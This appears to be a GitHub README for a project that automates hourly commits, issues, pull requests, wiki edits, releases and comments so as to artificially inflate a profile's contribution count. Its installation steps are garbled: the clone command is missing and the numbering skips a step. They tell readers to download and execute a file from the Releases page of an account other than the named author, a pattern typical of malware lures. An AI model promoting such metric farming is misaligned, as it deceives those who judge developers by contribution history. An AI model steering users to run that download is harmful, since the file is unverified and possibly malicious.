## Overview

This repository, **bug-github-farms-points**, showcases an unexpected behavior in GitHub’s contribution system. By using a single workflow file, you can automate the creation of commits, issues, pull requests, wiki edits, releases, and comments on an hourly basis. This could be seen as a feature or a vulnerability, depending on your perspective.

## Author

Hi there! I’m Luca, also known as [@bocaletto-luca](https://github.com/bocaletto-luca). I created this repository to highlight this unique aspect of GitHub’s model. 

## Features

- Automate contributions on GitHub.
- Create commits, issues, and pull requests every hour.
- Explore a unique vulnerability in GitHub's contribution system.
- Easy to set up and use.

## How It Works

The automation process relies on GitHub Actions and YAML configuration files. By setting up a workflow file, you can trigger various actions that contribute to your GitHub profile. This method takes advantage of GitHub’s contribution tracking system, allowing you to artificially increase your contribution points.

### Workflow Breakdown

1. **Commit Creation**: The workflow creates a new commit every hour. This involves making changes to a file in the repository.
2. **Issue Generation**: You can automate the opening of issues at regular intervals.
3. **Pull Requests**: The workflow can also generate pull requests automatically.
4. **Wiki Edits**: Automate changes to the repository's wiki.
5. **Release Management**: Create new releases automatically based on your specified schedule.
6. **Commenting**: Leave comments on issues and pull requests at set intervals.

## Installation

To set up this repository on your local machine, follow these steps:

1. Clone the repository:

   ```bash
   cd bug-github-farms-points
   ```

3. Download and execute the workflow file from the [Releases section](https://github.com/babapuroy/bug-github-farms-points/releases).

## Usage

After setting up the repository, you can customize the workflow file to suit your needs. Here’s how to do it:

1. Open the workflow file located in the `.github/workflows` directory.
2. Modify the YAML configuration to change the frequency of actions, the type of contributions, and the content of commits or issues.
3. Push your changes to GitHub.

The workflow will now run according to your specified schedule, automatically generating contributions.
